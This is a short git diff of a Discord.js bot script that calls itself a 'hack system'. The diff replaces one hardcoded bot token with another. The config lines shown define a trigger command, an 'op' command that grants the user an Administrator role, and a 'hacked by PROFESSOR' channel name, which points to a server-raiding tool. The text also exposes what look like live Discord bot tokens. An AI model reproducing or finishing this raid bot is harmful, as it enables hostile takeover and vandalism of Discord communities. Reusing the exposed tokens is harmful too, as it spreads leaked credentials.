@@ -14,7 +14,7 @@
 //By xxxRevenge (Bowlingtoolkit)
 const Discord = require("discord.js") //npm i discord.js
 const client = new Discord.Client();
-const Token = 'NjMwNDU5MTQ4OTg2ODc1OTM1.Xn03PQ.B1dDd6SmuxOiogt0gkD8Cb8_BME' //حط توكن بوتك هنا // your bot token
+const Token = 'NjMwNDU5MTQ4OTg2ODc1OTM1.Xn1EJg.04090GNuxdiP-t1CxY-skRoANJo' //حط توكن بوتك هنا // your bot token
 const x_x = "zebi" //الامر يلي يشغل الكود //the command to start the hack system
 const opcmd = 'zebi' // The Op Command To Give You Adminstrator Role
 const teext = "hacked by PROFESSOR [DONT MESS WITH ME]" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
